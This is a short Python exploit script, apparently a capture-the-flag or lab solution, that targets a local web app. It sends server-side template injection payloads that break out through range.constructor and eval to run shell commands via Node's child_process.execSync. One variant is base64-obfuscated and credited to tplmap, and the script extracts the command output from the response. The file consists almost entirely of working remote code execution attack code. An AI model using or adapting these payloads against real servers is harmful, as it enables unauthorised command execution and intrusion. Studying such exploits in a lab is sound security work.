import requests
import re
import HTMLParser
import base64

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5062/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1

#tplmap exploit 
command_to_execute = "ls"
code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
code_b64_Encoded =base64.b64encode( code_to_execute )
jscode = '''range.constructor("return eval(Buffer('%s','base64').toString())")()'''%code_b64_Encoded
payload ='''{{%s}}'''%jscode

#My exploit
jscode = "global.process.mainModule.require('child_process').execSync('ls').toString()"
#jscode = "require('child_process').execSync('ls').toString()" dont have require
#jscode = "require('child_process')"
#jscode = "1+1"
payload ='''{{range.constructor("return eval(\\"%s\\")")()}}'''%jscode
#payload ='''{{range.constructor("%s")()}}'''%jscode
#payload = '''{{1+1}}'''
print payload
#range.constructor("return eval()")()

resutl = sendPayload(payload)
try:
    regex = r"<p>Hello([\s\S]*)</p>"
    matches = re.findall(regex,resutl)
    print HTMLParser.HTMLParser().unescape(matches[0])
except:
    print "RESULT ERROR:\n"+resutl







